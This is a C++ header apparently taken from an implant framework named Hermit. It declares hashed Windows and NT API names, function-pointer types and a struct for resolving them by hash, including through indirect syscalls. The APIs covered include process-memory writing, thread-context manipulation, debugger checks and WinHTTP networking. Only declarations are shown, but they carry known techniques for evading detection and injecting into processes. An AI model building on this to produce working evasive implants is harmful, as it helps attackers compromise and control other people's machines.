#ifndef HERMIT_CORE_PROCS_HPP
#define HERMIT_CORE_PROCS_HPP

#include "core/nt.hpp"
#include "core/stdout.hpp"
#include "core/syscalls.hpp"
#include "core/utils.hpp"

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <strsafe.h>

#define APIHASH_LDRLOADDLL                  0x19cb5e59
#define APIHASH_NTADJUSTPRIVILEGESTOKEN     0x1b79f58d
#define APIHASH_NTALLOCATEVIRTUALMEMORY     0xf8829394
#define APIHASH_NTCLOSE                     0x6f18e5dd
#define APIHASH_NTCREATEFILE                0x2f4d94d3
#define APIHASH_NTCREATENAMEDPIPEFILE       0x333974ac
#define APIHASH_NTCREATEPROCESSEX           0xbd003d8b
#define APIHASH_NTCREATETHREADEX            0x2afc9934
#define APIHASH_NTDELETEFILE                0xcd2f2302
#define APIHASH_NTDUPLICATEOBJECT           0xae23334f
#define APIHASH_NTENUMERATEVALUEKEY         0xa153b717
#define APIHASH_NTFLUSHINSTRUCTIONCACHE     0x3a43951d
#define APIHASH_NTFREEVIRTUALMEMORY         0xb6eb4645
#define APIHASH_NTGETCONTEXTTHREAD          0x904d345e
#define APIHASH_NTOPENFILE                  0x740aa9e1
#define APIHASH_NTOPENKEYEX                 0x16b3e52d
#define APIHASH_NTOPENPROCESS               0x64e24f6a
#define APIHASH_NTOPENPROCESSTOKEN          0xcdd9f7af
#define APIHASH_NTOPENTHREAD                0xa58f60af
#define APIHASH_NTPRIVILEGECHECK            0x73129112
#define APIHASH_NTPROTECTVIRTUALMEMORY      0xa7df2bd8
#define APIHASH_NTQUERYINFORMATIONFILE      0x6226c85b
#define APIHASH_NTQUERYINFORMATIONPROCESS   0xa79c59b0
#define APIHASH_NTQUERYINFORMATIONTOKEN     0x8a713c7a
#define APIHASH_NTQUERYKEY                  0x43da72
#define APIHASH_NTQUERYSYSTEMINFORMATION    0x1bfabb50
#define APIHASH_NTREADFILE                  0xc363b2ad
#define APIHASH_NTREADVIRTUALMEMORY         0x88bc3b5b
#define APIHASH_NTRESUMETHREAD              0x8bad8d92
#define APIHASH_NTSETCONTEXTTHREAD          0x25df9cd2
#define APIHASH_NTSETINFORMATIONFILE        0x52a8041
#define APIHASH_NTSETINFORMATIONPROCESS     0xb5d02d0a
#define APIHASH_NTSYSTEMDEBUGCONTROL        0x4def6394
#define APIHASH_NTTERMINATEPROCESS          0xc58a7b49
#define APIHASH_NTUNMAPVIEWOFSECTION        0x574e9fc1
#define APIHASH_NTWAITFORSINGLEOBJECT       0x73c87a00
#define APIHASH_NTWRITEFILE                 0x9339e2e0
#define APIHASH_NTWRITEVIRTUALMEMORY        0x7c61e008
#define APIHASH_RTLALLOCATEHEAP             0xcc7755e
#define APIHASH_RTLEXPANDENVIRONMENTSTRINGS 0xb73f443e
#define APIHASH_RTLGETCURRENTDIRECTORY_U    0x4a121ccb
#define APIHASH_RTLGETFULLPATHNAME_U        0x2116c216
#define APIHASH_RTLINITUNICODESTRING        0x4dc9caa9
#define APIHASH_RTLQUERYSYSTEMINFORMATION   0xf6044a6a
#define APIHASH_RTLSETCURRENTDIRECTORY_U    0x4cd546d7
#define APIHASH_RTLSTRINGCCHCATW            0x2deef223
#define APIHASH_RTLSTRINGCCHCOPYW           0x32231e60
#define APIHASH_RTLSTRINGCCHLENGTHW         0x28821d8f
#define APIHASH_RTLZEROMEMORY               0x899c0d1e
#define APIHASH_CHECKREMOTEDEBUGGERPRESENT  0x478dd921
#define APIHASH_CLOSEHANDLE                 0x47bdd9cb
#define APIHASH_CREATETHREADPOOLWAIT        0x7a8370ac
#define APIHASH_DLLMAIN                     0xe2e2f348
#define APIHASH_GETPROCADDRESS              0xafa3e09d
#define APIHASH_ISDEBUGGERPRESENT           0xef4ed1b
#define APIHASH_LOADLIBRARYA                0x7069f241
#define APIHASH_LOADLIBRARYW                0x7069f257
#define APIHASH_MESSAGEBOXA                 0xcc4a1d08
#define APIHASH_QUERYFULLPROCESSIMAGENAMEW  0xa6e1683e
#define APIHASH_RTLADDFUNCTIONTABLE         0xbe7f92ca
#define APIHASH_SETFILEINFORMATIONBYHANDLE  0xbfea4fe2
#define APIHASH_SETTHREADPOOLWAIT           0x5f2a3808
#define APIHASH_VIRTUALALLOC                0x5ae0dabf
#define APIHASH_VIRTUALPROTECT              0x927857d9
#define APIHASH_VIRTUALFREE                 0x640675a2
#define APIHASH_WINHTTPCLOSEHANDLE          0x22081731
#define APIHASH_WINHTTPCONNECT              0xe18b30db
#define APIHASH_WINHTTPOPEN                 0x97451379
#define APIHASH_WINHTTPOPENREQUEST          0xd6cffcd6
#define APIHASH_WINHTTPQUERYDATAAVAILABLE   0xff301fc6
#define APIHASH_WINHTTPQUERYHEADERS         0xe17c65cd
#define APIHASH_WINHTTPREADDATA             0x70389c8f
#define APIHASH_WINHTTPRECEIVERESPONSE      0x66131eb5
#define APIHASH_WINHTTPSENDREQUEST          0x79792358
#define APIHASH_WINHTTPSETOPTION            0x48ed79a8
#define APIHASH_WINHTTPWRITEDATA            0xeed55fda

#define HASH_IV     0x35
#define RANDOM_ADDR 0xab10f29f

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

namespace Procs
{
    // **NATIVE APIs**

    // LdrLoadDll
    typedef NTSTATUS (NTAPI* LPPROC_LDRLOADDLL)(PWSTR DllPath, PULONG DllCharacteristics, PUNICODE_STRING DllName, PVOID *DllHandle);
    // NtAdjustPrivilegesToken
    typedef NTSTATUS (NTAPI* LPPROC_NTADJUSTPRIVILEGESTOKEN)(HANDLE TokenHandle, BOOLEAN DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, ULONG BufferLength, PTOKEN_PRIVILEGES PreviousState, PULONG ReturnLength);
    // NtAllocateVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTALLOCATEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    // NtClose
	typedef NTSTATUS (NTAPI* LPPROC_NTCLOSE)(HANDLE Handle);
    // NtCreateFile
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATEFILE)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
    // NtCreateNamedPipeFile
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATENAMEDPIPEFILE)(PHANDLE FileHandle, ULONG DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, ULONG NamedPipeType, ULONG ReadMode, ULONG CompletionMode, ULONG MaximumInstances, ULONG InboundQuota, ULONG OutboundQuota, PLARGE_INTEGER DefaultTimeout);
    // NtCreateProcessEx
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATEPROCESSEX)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE TokenHandle, ULONG Reserved);
    // NtCreateThreadEx
    typedef NTSTATUS (NTAPI* LPPROC_NTCREATETHREADEX)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
    // NtDeleteFile
    typedef NTSTATUS (NTAPI* LPPROC_NTDELETEFILE)(POBJECT_ATTRIBUTES ObjectAttributes);
    // NtDuplicateObject
    typedef NTSTATUS (NTAPI* LPPROC_NTDUPLICATEOBJECT)(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options);
    // NtGetContextThread
    typedef NTSTATUS (NTAPI* LPPROC_NTGETCONTEXTTHREAD)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
    // NtEnumerateValueKey
    typedef NTSTATUS (NTAPI* LPPROC_NTENUMERATEVALUEKEY)(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength);
    // NtFlushInstructionCache
    typedef NTSTATUS (NTAPI* LPPROC_NTFLUSHINSTRUCTIONCACHE)(HANDLE ProcessHandle, PVOID BaseAddress, SIZE_T Length);
    // NtFreeVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTFREEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
    // NtOpenFile
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENFILE)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions);
    // NtOpenProcess
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENPROCESS)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
    // NtOpenProcessToken
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENPROCESSTOKEN)(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
    // NtOpenKeyEx
    typedef NTSTATUS (NTAPI* LPPROC_NTOPENKEYEX)(PHANDLE KeyHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG OpenOptions);
    // NtPrivilegeCheck
    typedef NTSTATUS (NTAPI* LPPROC_NTPRIVILEGECHECK)(HANDLE ClientToken, PPRIVILEGE_SET RequiredPrivileges, PBOOLEAN Result);
    // NtProtectVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTPROTECTVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
    // NtQueryInformationFile
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYINFORMATIONFILE)(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
    // NtQueryInformationProcess
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYINFORMATIONPROCESS)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
    // NtQueryInformationToken
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYINFORMATIONTOKEN)(HANDLE HandleToken, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);
    // NtQueryKey
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYKEY)(HANDLE KeyHandle, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength);
    // NtQuerySystemInformation
    typedef NTSTATUS (NTAPI* LPPROC_NTQUERYSYSTEMINFORMATION)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    // NtReadFile
    typedef NTSTATUS (NTAPI* LPPROC_NTREADFILE)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
    // NtReadVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTREADVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead);
    // NtResumeThread
    typedef NTSTATUS (NTAPI* LPPROC_NTRESUMETHREAD)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
    // NtSetContextThread
    typedef NTSTATUS (NTAPI* LPPROC_NTSETCONTEXTTHREAD)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
    // NtSetInformationFile
    typedef NTSTATUS (NTAPI* LPPROC_NTSETINFORMATIONFILE)(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);
    // NtSetInformationProcess
    typedef NTSTATUS (NTAPI* LPPROC_NTSETINFORMATIONPROCESS)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
    // NtSystemDebugControl
    typedef NTSTATUS (NTAPI* LPPROC_NTSYSTEMDEBUGCONTROL)(SYSDBG_COMMAND Command, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength, PULONG ReturnLength);
    // NtTerminateProcess
	typedef NTSTATUS (NTAPI* LPPROC_NTTERMINATEPROCESS)(HANDLE ProcessHandle, NTSTATUS ExitStatus);
    // NtUnmapViewOfSection
    typedef NTSTATUS (NTAPI* LPPROC_NTUNMAPVIEWOFSECTION)(HANDLE ProcessHandle, PVOID BaseAddress);
    // NtWaitForSingleObject
    typedef NTSTATUS (NTAPI* LPPROC_NTWAITFORSINGLEOBJECT)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
    // NtWriteFile
    typedef NTSTATUS (NTAPI* LPPROC_NTWRITEFILE)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
    // NtWriteVirtualMemory
    typedef NTSTATUS (NTAPI* LPPROC_NTWRITEVIRTUALMEMORY)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
    // RtlAllocateHeap
    typedef PVOID (NTAPI* LPPROC_RTLALLOCATEHEAP)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);
    // RtlExpandEnvironmentStrings
    typedef NTSTATUS (NTAPI* LPPROC_RTLEXPANDENVIRONMENTSTRINGS)(PVOID Environment, PCWSTR Source, SIZE_T SourceLength, PWSTR Destination, SIZE_T DestinationLength, PSIZE_T ReturnLength);
    // RtlGetCurrentDirectory_U
    typedef ULONG (NTAPI* LPPROC_RTLGETCURRENTDIRECTORY_U)(ULONG BufferLength, PWSTR Buffer);
    // RtlGetFullPathName_U
    typedef NTSTATUS (NTAPI* LPPROC_RTLGETFULLPATHNAME_U)(PCWSTR FileName, ULONG BufferLength, PWSTR Buffer, PWSTR *FilePart);
    // RtlInitUnicodeString
    typedef NTSTATUS (NTAPI* LPPROC_RTLINITUNICODESTRING)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
    // RtlQuerySystemInformation
    typedef NTSTATUS (NTAPI* LPPROC_RTLQUERYSYSTEMINFORMATION)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    // RtlSetCurrentDirectory_U
    typedef NTSTATUS (NTAPI* LPPROC_RTLSETCURRENTDIRECTORY_U)(PUNICODE_STRING PathName);
    // RtlStringCchCatW
    typedef NTSTATUS (NTAPI* LPPROC_RTLSTRINGCCHCATW)(LPWSTR pszDest, SIZE_T cchDest, LPCWSTR pszSrc);
    // RtlStringCchCopyW
    typedef NTSTATUS (NTAPI* LPPROC_RTLSTRINGCCHCOPYW)(LPWSTR pszDest, SIZE_T cchDest, LPCWSTR pszSrc);
    // RtlStringCchLengthW
    typedef NTSTATUS (NTAPI* LPPROC_RTLSTRINGCCHLENGTHW)(PCWSTR psz, SIZE_T cchMax, SIZE_T *pcchLength);
    // RtlZeroMemory
    typedef VOID (NTAPI* LPPROC_RTLZEROMEMORY)(PVOID Destination, SIZE_T Length);
    
    // **WINAPIs**

    // CheckRemoteDebuggerPresent
    typedef BOOL (WINAPI* LPPROC_CHECKREMOTEDEBUGGERPRESENT)(HANDLE hProcess, PBOOL pbDebuggerPresent);
    // CloseHandle
    typedef BOOL (WINAPI* LPPROC_CLOSEHANDLE)(HANDLE hObject);
    // DllMain
    typedef BOOL (WINAPI* LPPROC_DLLMAIN)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
    // GetProcAddress
    typedef FARPROC (WINAPI* LPPROC_GETPROCADDRESS)(HMODULE hModule, LPCSTR lpProcName);
    // IsDebuggerPresent
    typedef BOOL (WINAPI* LPPROC_ISDEBUGGERPRESENT)();
    // LoadLibraryA
    typedef HMODULE (WINAPI* LPPROC_LOADLIBRARYA)(LPCSTR lpLibFileName);
    // LoadLibraryW
    typedef HMODULE (WINAPI* LPPROC_LOADLIBRARYW)(LPCWSTR lpLibFileName);
    // MessageBoxA
    typedef int (WINAPI* LPPROC_MESSAGEBOXA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
    // QueryFullProcessImageNameW
    typedef BOOL (WINAPI* LPPROC_QUERYFULLPROCESSIMAGENAMEW)(HANDLE hProcess, DWORD  dwFlags, LPWSTR lpExeName, PDWORD lpdwSize);
    // RtlAddFunctionTable
    typedef BOOL (WINAPI* LPPROC_RTLADDFUNCTIONTABLE)(PRUNTIME_FUNCTION FunctionTable, DWORD EntryCount, DWORD64 BaseAddress);
    // SetFileInformationByHandle
    typedef BOOL (WINAPI* LPPROC_SETFILEINFORMATIONBYHANDLE)(HANDLE hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize);
    // VirtualAlloc
    typedef LPVOID (WINAPI* LPPROC_VIRTUALALLOC)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    // VirtualFree
    typedef BOOL (WINAPI* LPPROC_VIRTUALFREE)(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
    // VirtualProtect
    typedef BOOL (WINAPI* LPPROC_VIRTUALPROTECT)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    // WinHttpCloseHandle
    typedef BOOL (WINAPI* LPPROC_WINHTTPCLOSEHANDLE)(HINTERNET hInternet);
    // WinHttpConnect
    typedef HINTERNET (WINAPI* LPPROC_WINHTTPCONNECT)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
    // WinHttpOpen
    typedef HINTERNET (WINAPI* LPPROC_WINHTTPOPEN)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
    // WinHttpOpenRequest
    typedef HINTERNET (WINAPI* LPPROC_WINHTTPOPENREQUEST)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);
    // WinHttpQueryDataAvailable
    typedef BOOL (WINAPI* LPPROC_WINHTTPQUERYDATAAVAILABLE)(HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
    // winHttpQueryHeaders
    typedef BOOL (WINAPI* LPPROC_WINHTTPQUERYHEADERS)(HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
    // WinHttpReadData
    typedef BOOL (WINAPI* LPPROC_WINHTTPREADDATA)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesLength, LPDWORD lpdwNumberOfBytesRead);
    // WinHttpReceiveResponse
    typedef BOOL (WINAPI* LPPROC_WINHTTPRECEIVERESPONSE)(HINTERNET hRequest, LPVOID lpReserved);
    // WinHttpSendRequest
    typedef BOOL (WINAPI* LPPROC_WINHTTPSENDREQUEST)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
    // WinHttpSetOption
    typedef BOOL (WINAPI* LPPROC_WINHTTPSETOPTION)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
    // WinHttpWriteData
    typedef BOOL (WINAPI* LPPROC_WINHTTPWRITEDATA)(HINTERNET hRequest, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite, LPDWORD lpdwNumberOfBytesWritten);

    struct PROCS
    {
        // **NTAPI**
        LPPROC_NTADJUSTPRIVILEGESTOKEN      lpNtAdjustPrivilegesToken           = nullptr;
        LPPROC_NTALLOCATEVIRTUALMEMORY      lpNtAllocateVirtualMemory           = nullptr;
        LPPROC_NTCLOSE                      lpNtClose                           = nullptr;
        LPPROC_NTCREATEFILE                 lpNtCreateFile                      = nullptr;
        LPPROC_NTCREATENAMEDPIPEFILE        lpNtCreateNamedPipeFile             = nullptr;
        LPPROC_NTCREATEPROCESSEX            lpNtCreateProcessEx                 = nullptr;
        LPPROC_NTCREATETHREADEX             lpNtCreateThreadEx                  = nullptr;
        LPPROC_NTDELETEFILE                 lpNtDeleteFile                      = nullptr;
        LPPROC_NTDUPLICATEOBJECT            lpNtDuplicateObject                 = nullptr;
        LPPROC_NTENUMERATEVALUEKEY          lpNtEnumerateValueKey               = nullptr;
        LPPROC_NTFREEVIRTUALMEMORY          lpNtFreeVirtualMemory               = nullptr;
        LPPROC_NTGETCONTEXTTHREAD           lpNtGetContextThread                = nullptr;
        LPPROC_NTOPENFILE                   lpNtOpenFile                        = nullptr;
        LPPROC_NTOPENKEYEX                  lpNtOpenKeyEx                       = nullptr;
        LPPROC_NTOPENPROCESS                lpNtOpenProcess                     = nullptr;
        LPPROC_NTOPENPROCESSTOKEN           lpNtOpenProcessToken                = nullptr;
        LPPROC_NTPRIVILEGECHECK             lpNtPrivilegeCheck                  = nullptr;
        LPPROC_NTPROTECTVIRTUALMEMORY       lpNtProtectVirtualMemory            = nullptr;
        LPPROC_NTQUERYINFORMATIONFILE       lpNtQueryInformationFile            = nullptr;
        LPPROC_NTQUERYINFORMATIONPROCESS    lpNtQueryInformationProcess         = nullptr;
        LPPROC_NTQUERYINFORMATIONTOKEN      lpNtQueryInformationToken           = nullptr;
        LPPROC_NTQUERYKEY                   lpNtQueryKey                        = nullptr;
        LPPROC_NTQUERYSYSTEMINFORMATION     lpNtQuerySystemInformation          = nullptr;
        LPPROC_NTREADFILE                   lpNtReadFile                        = nullptr;
        LPPROC_NTREADVIRTUALMEMORY          lpNtReadVirtualMemory               = nullptr;
        LPPROC_NTRESUMETHREAD               lpNtResumeThread                    = nullptr;
        LPPROC_NTSETCONTEXTTHREAD           lpNtSetContextThread                = nullptr;
        LPPROC_NTSETINFORMATIONFILE         lpNtSetInformationFile              = nullptr;
        LPPROC_NTSETINFORMATIONPROCESS      lpNtSetInformationProcess           = nullptr;
        LPPROC_NTSYSTEMDEBUGCONTROL         lpNtSystemDebugControl              = nullptr;
        LPPROC_NTTERMINATEPROCESS           lpNtTerminateProcess                = nullptr;
        LPPROC_NTUNMAPVIEWOFSECTION         lpNtUnmapViewOfSection              = nullptr;
        LPPROC_NTWAITFORSINGLEOBJECT        lpNtWaitForSingleObject             = nullptr;
        LPPROC_NTWRITEFILE                  lpNtWriteFile                       = nullptr;
        LPPROC_NTWRITEVIRTUALMEMORY         lpNtWriteVirtualMemory              = nullptr;
        LPPROC_RTLALLOCATEHEAP              lpRtlAllocateHeap                   = nullptr;
        LPPROC_RTLEXPANDENVIRONMENTSTRINGS  lpRtlExpandEnvironmentStrings       = nullptr;
        LPPROC_RTLGETCURRENTDIRECTORY_U     lpRtlGetCurrentDirectory_U          = nullptr;
        LPPROC_RTLGETFULLPATHNAME_U         lpRtlGetFullPathName_U              = nullptr;
        LPPROC_RTLINITUNICODESTRING         lpRtlInitUnicodeString              = nullptr;
        LPPROC_RTLQUERYSYSTEMINFORMATION    lpRtlQuerySystemInformation         = nullptr;
        LPPROC_RTLSETCURRENTDIRECTORY_U     lpRtlSetCurrentDirectory_U          = nullptr;
        LPPROC_RTLSTRINGCCHCATW             lpRtlStringCchCatW                  = nullptr;
        LPPROC_RTLSTRINGCCHCOPYW            lpRtlStringCchCopyW                 = nullptr;
        LPPROC_RTLSTRINGCCHLENGTHW          lpRtlStringCchLengthW               = nullptr;
        LPPROC_RTLZEROMEMORY                lpRtlZeroMemory                     = nullptr;

        // **WINAPI**
        LPPROC_CHECKREMOTEDEBUGGERPRESENT   lpCheckRemoteDebuggerPresent        = nullptr;
        LPPROC_ISDEBUGGERPRESENT            lpIsDebuggerPresent                 = nullptr;
        LPPROC_QUERYFULLPROCESSIMAGENAMEW   lpQueryFullProcessImageNameW        = nullptr;
        LPPROC_SETFILEINFORMATIONBYHANDLE   lpSetFileInformationByHandle        = nullptr;
        LPPROC_WINHTTPCLOSEHANDLE           lpWinHttpCloseHandle                = nullptr;
        LPPROC_WINHTTPCONNECT               lpWinHttpConnect                    = nullptr;
        LPPROC_WINHTTPOPEN                  lpWinHttpOpen                       = nullptr;
        LPPROC_WINHTTPOPENREQUEST           lpWinHttpOpenRequest                = nullptr;
        LPPROC_WINHTTPQUERYDATAAVAILABLE    lpWinHttpQueryDataAvailable         = nullptr;
        LPPROC_WINHTTPQUERYHEADERS          lpWinHttpQueryHeaders               = nullptr;
        LPPROC_WINHTTPREADDATA              lpWinHttpReadData                   = nullptr;
        LPPROC_WINHTTPRECEIVERESPONSE       lpWinHttpReceiveResponse            = nullptr;
        LPPROC_WINHTTPSENDREQUEST           lpWinHttpSendRequest                = nullptr;
        LPPROC_WINHTTPSETOPTION             lpWinHttpSetOption                  = nullptr;
        LPPROC_WINHTTPWRITEDATA             lpWinHttpWriteData                  = nullptr;

        // **SYSCALLS**
        Syscalls::SYSCALL                   sysNtAdjustPrivilegesToken          = {0};
        Syscalls::SYSCALL                   sysNtAllocateVirtualMemory          = {0};
        Syscalls::SYSCALL                   sysNtClose                          = {0};
        Syscalls::SYSCALL                   sysNtCreateFile                     = {0};
        Syscalls::SYSCALL                   sysNtCreateNamedPipeFile            = {0};
        Syscalls::SYSCALL                   sysNtCreateProcessEx                = {0};
        Syscalls::SYSCALL                   sysNtCreateThreadEx                 = {0};
        Syscalls::SYSCALL                   sysNtDeleteFile                     = {0};
        Syscalls::SYSCALL                   sysNtDuplicateObject                = {0};
        Syscalls::SYSCALL                   sysNtEnumerateValueKey              = {0};
        Syscalls::SYSCALL                   sysNtFreeVirtualMemory              = {0};
        Syscalls::SYSCALL                   sysNtGetContextThread               = {0};
        Syscalls::SYSCALL                   sysNtOpenFile                       = {0};
        Syscalls::SYSCALL                   sysNtOpenKeyEx                      = {0};
        Syscalls::SYSCALL                   sysNtOpenProcess                    = {0};
        Syscalls::SYSCALL                   sysNtOpenProcessToken               = {0};
        Syscalls::SYSCALL                   sysNtPrivilegeCheck                 = {0};
        Syscalls::SYSCALL                   sysNtProtectVirtualMemory           = {0};
        Syscalls::SYSCALL                   sysNtQueryInformationFile           = {0};
        Syscalls::SYSCALL                   sysNtQueryInformationProcess        = {0};
        Syscalls::SYSCALL                   sysNtQueryInformationToken          = {0};
        Syscalls::SYSCALL                   sysNtQueryKey                       = {0};
        Syscalls::SYSCALL                   sysNtQuerySystemInformation         = {0};
        Syscalls::SYSCALL                   sysNtReadFile                       = {0};
        Syscalls::SYSCALL                   sysNtReadVirtualMemory              = {0};
        Syscalls::SYSCALL                   sysNtResumeThread                   = {0};
        Syscalls::SYSCALL                   sysNtSetContextThread               = {0};
        Syscalls::SYSCALL                   sysNtSetInformationFile             = {0};
        Syscalls::SYSCALL                   sysNtSetInformationProcess          = {0};
        Syscalls::SYSCALL                   sysNtSystemDebugControl             = {0};
        Syscalls::SYSCALL                   sysNtTerminateProcess               = {0};
        Syscalls::SYSCALL                   sysNtUnmapViewOfSection             = {0};
        Syscalls::SYSCALL                   sysNtWaitForSingleObject            = {0};
        Syscalls::SYSCALL                   sysNtWriteFile                      = {0};
        Syscalls::SYSCALL                   sysNtWriteVirtualMemory             = {0};
        Syscalls::SYSCALL                   sysRtlAllocateHeap                  = {0};
        Syscalls::SYSCALL                   sysRtlExpandEnvironmentStrings      = {0};
        Syscalls::SYSCALL                   sysRtlGetCurrentDirectory_U         = {0};
        Syscalls::SYSCALL                   sysRtlGetFullPathName_U             = {0};
        Syscalls::SYSCALL                   sysRtlInitUnicodeString             = {0};
        Syscalls::SYSCALL                   sysRtlQuerySystemInformation        = {0};
        Syscalls::SYSCALL                   sysRtlSetCurrentDirectory_U         = {0};
    };
    typedef PROCS* PPROCS;

    DWORD GetHashFromString(char* str);
    PVOID GetProcAddressByHash(
        HMODULE hModule,
        DWORD   dwHash
    );
    PPROCS FindProcs(
        HMODULE hNTDLL,
        HMODULE hKernel32DLL,
        HMODULE hWinHTTPDLL,
        BOOL bIndirectSyscalls
    );
}

#endif // HERMIT_CORE_PROCS_HPP
